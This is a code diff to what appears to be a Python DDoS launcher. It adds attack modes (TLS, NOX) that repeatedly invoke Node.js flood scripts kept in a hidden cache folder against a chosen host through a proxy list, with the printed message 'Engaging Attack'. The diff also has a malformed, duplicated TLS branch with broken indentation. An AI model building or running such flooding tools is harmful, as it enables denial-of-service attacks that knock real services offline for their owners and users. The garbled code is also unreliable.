@@ -163,6 +163,7 @@ elif command == "LAYER7":
             except IndexError:
                 print('❌ Invalid Command. Usage: METHOD URL TIME')
                 print('Example: TOR https://example.com 60')
+
         elif command == "TLS":
             try:
                 host = parts[1]
@@ -173,6 +174,7 @@ elif command == "LAYER7":
                 ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
 
                 while t.time() - start_time < time:
+                    o.system(f'node bin/odd/.cache/TorXTls.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
                     o.system(f'node bin/odd/.cache/TorXDark.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
                     t.sleep(1)
 
@@ -180,8 +182,7 @@ elif command == "LAYER7":
                 print('❌ Invalid Command. Usage: METHOD URL TIME')
                 print('Example: TOR https://example.com 60')
 
-
-        elif command == "HTTPX":
+ elif command == "TLS":
             try:
                 host = parts[1]
                 time = int(parts[2])
@@ -191,8 +192,26 @@ elif command == "LAYER7":
                 ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
 
                 while t.time() - start_time < time:
-                    o.system(f'node bin/odd/.cache/HTTPX.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
-                    o.system(f'node bin/odd/.cache/HTTPZ.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
+                    o.system(f'node bin/odd/.cache/TorXTls.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
+                    o.system(f'node bin/odd/.cache/TorXDark.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
+                    t.sleep(1)
+
+            except IndexError:
+                print('❌ Invalid Command. Usage: METHOD URL TIME')
+                print('Example: TOR https://example.com 60')
+
+        elif command == "NOX":
+            try:
+                host = parts[1]
+                time = int(parts[2])
+                max_time = 60
+                start_time = t.time()
+
+                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
+
+                while t.time() - start_time < time:
+                    o.system(f'node bin/odd/.cache/NOX.js {host} {max_time} 20 90 bin/odd/.cache/proxy.txt')
+                    o.system(f'node bin/odd/.cache/NOX.js {host} {max_time} 20 90 bin/odd/.cache/proxy.txt')
                     t.sleep(1)
 
             except IndexError:
